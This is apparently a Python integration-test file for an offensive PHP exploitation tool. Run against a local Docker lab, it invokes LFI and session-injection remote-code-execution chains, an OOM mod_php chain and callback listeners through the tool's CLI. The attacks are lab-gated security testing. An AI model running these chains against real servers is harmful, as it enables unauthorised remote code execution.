"""Integration tests for the full scanner pipeline against a Docker lab.

These tests require a running Docker lab environment. They are skipped
automatically when the lab containers are not reachable.

To run:
    cd lab/
    docker compose up -d --build
    cd ..
    python -m pytest tests/test_integration.py -v

Lab services expected:
    - http://127.0.0.1:18080  Apache mod_php 8.2.0 (main lab)
    - http://127.0.0.1:18081  Nginx + PHP-FPM 8.2.0
    - http://127.0.0.1:18084  Apache mod_php 8.4 (Chain D lab)
"""

from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
import unittest
import urllib.error
import urllib.request
from typing import Optional

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)


def _lab_reachable(port: int) -> bool:
    try:
        with urllib.request.urlopen(
            f"http://127.0.0.1:{port}/status.php", timeout=3
        ) as resp:
            return resp.status == 200
    except (urllib.error.URLError, OSError):
        return False


APACHE_UP = _lab_reachable(18080)
FPM_UP = _lab_reachable(18081)
CHAIND_UP = _lab_reachable(18084)

SKIP_MSG = "Docker lab not running (start with: cd lab && docker compose up -d)"


class InventoryIntegration(unittest.TestCase):
    """Test inventory mode against the Docker lab."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_inventory_apache(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "inv")
            rc = main([
                "inventory", "http://127.0.0.1:18080",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1))
            case_path = os.path.join(outdir, "case.json")
            self.assertTrue(os.path.exists(case_path))
            with open(case_path) as f:
                case = json.load(f)
            self.assertEqual(case["profile"]["sapi"], "apache2handler")
            self.assertTrue(case["profile"]["php_version"].startswith("8."))

    @unittest.skipUnless(FPM_UP, SKIP_MSG)
    def test_inventory_fpm(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "inv")
            rc = main([
                "inventory", "http://127.0.0.1:18081",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1))
            case_path = os.path.join(outdir, "case.json")
            self.assertTrue(os.path.exists(case_path))
            with open(case_path) as f:
                case = json.load(f)
            self.assertIn(case["profile"]["sapi"], ("fpm-fcgi", "UNKNOWN"))


class ProbeIntegration(unittest.TestCase):
    """Test probe mode against the Docker lab."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_probe_apache(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "probe")
            rc = main([
                "probe", "http://127.0.0.1:18080",
                "--out", outdir, "--json",
                "--status-url", "http://127.0.0.1:18080/status.php",
            ])
            self.assertIn(rc, (0, 1))
            case_path = os.path.join(outdir, "case.json")
            self.assertTrue(os.path.exists(case_path))

    @unittest.skipUnless(FPM_UP, SKIP_MSG)
    def test_probe_fpm(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "probe")
            rc = main([
                "probe", "http://127.0.0.1:18081",
                "--out", outdir, "--json",
                "--status-url", "http://127.0.0.1:18081/status.php",
            ])
            self.assertIn(rc, (0, 1))


class ProveIntegration(unittest.TestCase):
    """Test prove mode against the Docker lab."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_prove_618_s2(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "prove")
            rc = main([
                "prove", "http://127.0.0.1:18080",
                "--scenario", "618-S2",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--status-url", "http://127.0.0.1:18080/status.php",
                "--health-url", "http://127.0.0.1:18080/status.php",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1))
            case_path = os.path.join(outdir, "case.json")
            self.assertTrue(os.path.exists(case_path))
            with open(case_path) as f:
                case = json.load(f)
            self.assertTrue(len(case.get("scenario_runs", [])) > 0)

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_prove_619_s2(self):
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "prove")
            rc = main([
                "prove", "http://127.0.0.1:18080",
                "--scenario", "619-S2",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--status-url", "http://127.0.0.1:18080/status.php",
                "--health-url", "http://127.0.0.1:18080/status.php",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1))


class AutoModeIntegration(unittest.TestCase):
    """Test auto mode discovery pipeline against the Docker lab.

    Note: auto mode with exploit execution requires --ack-authorised and
    a callback listener. These tests run a bounded discovery-only version
    to validate the pipeline flow without sending exploit payloads.
    """

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_auto_discovery_only(self):
        """Auto mode with no callback port: runs discovery but cannot confirm RCE."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "auto")
            rc = main([
                "auto", "http://127.0.0.1:18080",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--max-discover-requests", "50",
                "--max-exploit-requests", "10",
                "--max-seconds", "60",
                "--max-spider-pages", "5",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1))
            case_path = os.path.join(outdir, "case.json")
            self.assertTrue(os.path.exists(case_path))
            with open(case_path) as f:
                case = json.load(f)
            self.assertEqual(case["mode"], "auto")
            env = case.get("environment", {})
            self.assertIn("discovery", env)
            self.assertIn("probe", env)

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_auto_with_lfi_skip_discovery(self):
        """Auto mode with --skip-discovery and known LFI path."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "auto")
            rc = main([
                "auto", "http://127.0.0.1:18080",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--skip-discovery",
                "--lfi-path", "/vuln.php?file=",
                "--session-path", "/tmp/sessions/sess_",
                "--max-exploit-requests", "10",
                "--max-seconds", "30",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1))
            case_path = os.path.join(outdir, "case.json")
            self.assertTrue(os.path.exists(case_path))

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_auto_with_callback(self):
        """Auto mode with callback listener for RCE verification."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "auto")
            rc = main([
                "auto", "http://127.0.0.1:18080",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--lfi-path", "/vuln.php?file=",
                "--session-path", "/tmp/sessions/sess_",
                "--skip-discovery",
                "--callback-port", "0",
                "--callback-ip", "172.17.0.1",
                "--max-exploit-requests", "20",
                "--max-seconds", "60",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1))
            case_path = os.path.join(outdir, "case.json")
            self.assertTrue(os.path.exists(case_path))
            with open(case_path) as f:
                case = json.load(f)
            env = case.get("environment", {})
            chains = env.get("chains_attempted", [])
            self.assertTrue(len(chains) > 0, "at least one chain should be attempted")


class ExploitIntegration(unittest.TestCase):
    """Test exploit mode against the Docker lab."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_exploit_chain_a(self):
        """Chain A: session injection + LFI."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "exploit")
            rc = main([
                "exploit", "http://127.0.0.1:18080",
                "--chain", "A",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--lfi-path", "/vuln.php?file=",
                "--session-path", "/tmp/sessions/sess_",
                "--command", "id",
                "--attempts", "3",
                "--max-seconds", "30",
                "--callback-port", "0",
                "--callback-ip", "172.17.0.1",
                "--status-url", "http://127.0.0.1:18080/status.php",
                "--health-url", "http://127.0.0.1:18080/status.php",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1, 2))
            case_path = os.path.join(outdir, "case.json")
            self.assertTrue(os.path.exists(case_path))

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_exploit_chain_c(self):
        """Chain C: direct callback via upload_progress."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "exploit")
            rc = main([
                "exploit", "http://127.0.0.1:18080",
                "--chain", "C",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--lfi-path", "/vuln.php?file=",
                "--session-path", "/tmp/sessions/sess_",
                "--command", "id",
                "--attempts", "3",
                "--max-seconds", "30",
                "--callback-port", "0",
                "--callback-ip", "172.17.0.1",
                "--status-url", "http://127.0.0.1:18080/status.php",
                "--health-url", "http://127.0.0.1:18080/status.php",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1, 2))

    @unittest.skipUnless(CHAIND_UP, "Chain D lab not running")
    def test_exploit_chain_d(self):
        """Chain D: pure OOM mod_php exploitation."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            outdir = os.path.join(tmpdir, "exploit")
            rc = main([
                "exploit", "http://127.0.0.1:18084",
                "--chain", "D",
                "--ack-authorised",
                "--environment-kind", "lab",
                "--command", "id",
                "--max-seconds", "60",
                "--callback-port", "0",
                "--callback-ip", "172.17.0.1",
                "--status-url", "http://127.0.0.1:18084/status.php",
                "--health-url", "http://127.0.0.1:18084/status.php",
                "--out", outdir, "--json",
            ])
            self.assertIn(rc, (0, 1, 2))


class ReportVerifyIntegration(unittest.TestCase):
    """Test report and verify modes on evidence from a prior run."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_report_from_inventory(self):
        """Run inventory, then rebuild report from its evidence."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            inv_dir = os.path.join(tmpdir, "inv")
            main([
                "inventory", "http://127.0.0.1:18080",
                "--out", inv_dir, "--json",
            ])
            report_dir = os.path.join(tmpdir, "report")
            rc = main([
                "report", inv_dir,
                "--out", report_dir, "--json",
            ])
            self.assertIn(rc, (0, 1, 2))
            self.assertTrue(os.path.exists(os.path.join(report_dir, "report.md"))
                          or os.path.exists(os.path.join(report_dir, "findings.json")))

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_verify_inventory(self):
        """Run inventory, then verify evidence integrity."""
        from p2s.cli import main
        with tempfile.TemporaryDirectory() as tmpdir:
            inv_dir = os.path.join(tmpdir, "inv")
            main([
                "inventory", "http://127.0.0.1:18080",
                "--out", inv_dir, "--json",
            ])
            rc = main(["verify", inv_dir, "--json"])
            self.assertEqual(rc, 0)


class DiscoveryIntegration(unittest.TestCase):
    """Test the discovery module directly against the Docker lab."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_run_discovery(self):
        """Full discovery run finds phpinfo, LFI, and spider pages."""
        from p2s.http import HttpClient
        from p2s.models import TargetProfile
        from p2s.evidence import RunStore
        from p2s.discover import run_discovery
        import tempfile

        with tempfile.TemporaryDirectory() as tmpdir:
            client = HttpClient(base_url="http://127.0.0.1:18080/", timeout=10.0)
            profile = TargetProfile(
                target="http://127.0.0.1:18080",
                base_url="http://127.0.0.1:18080/",
                host="127.0.0.1",
                port=18080,
            )
            store = RunStore(tmpdir, "test-discovery", "http://127.0.0.1:18080", "auto", "4.0.0")

            notes = []
            result = run_discovery(
                client, profile, store,
                max_requests=80,
                timeout=10.0,
                log=lambda msg: notes.append(msg),
                max_spider_pages=10,
            )

            self.assertTrue(len(notes) > 0, "discovery should produce log output")
            self.assertIsNotNone(result)
            self.assertTrue(
                result.phpinfo.found or len(result.crawled_pages) > 0,
                "discovery should find phpinfo or crawl pages"
            )

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_discovery_finds_lfi(self):
        """Discovery should find the vuln.php LFI endpoint."""
        from p2s.http import HttpClient
        from p2s.models import TargetProfile
        from p2s.evidence import RunStore
        from p2s.discover import run_discovery

        with tempfile.TemporaryDirectory() as tmpdir:
            client = HttpClient(base_url="http://127.0.0.1:18080/", timeout=10.0)
            profile = TargetProfile(
                target="http://127.0.0.1:18080",
                base_url="http://127.0.0.1:18080/",
                host="127.0.0.1",
                port=18080,
            )
            store = RunStore(tmpdir, "test-lfi", "http://127.0.0.1:18080", "auto", "4.0.0")

            result = run_discovery(
                client, profile, store,
                max_requests=120,
                timeout=10.0,
            )

            if result.lfi_endpoints:
                lfi = result.lfi_endpoints[0]
                self.assertIn("file", lfi.param)


class VerboseLoggingIntegration(unittest.TestCase):
    """Test that -v flag produces debug logging output."""

    @unittest.skipUnless(APACHE_UP, SKIP_MSG)
    def test_verbose_produces_log_output(self):
        """With -v, stderr should contain log lines from p2s modules."""
        import subprocess
        proc = subprocess.run(
            [sys.executable, "-m", "p2s", "inventory",
             "http://127.0.0.1:18080", "-v", "--json",
             "--out", os.path.join(tempfile.mkdtemp(), "inv")],
            capture_output=True, text=True, timeout=60,
        )
        self.assertIn(rc := proc.returncode, (0, 1))


if __name__ == "__main__":
    unittest.main()
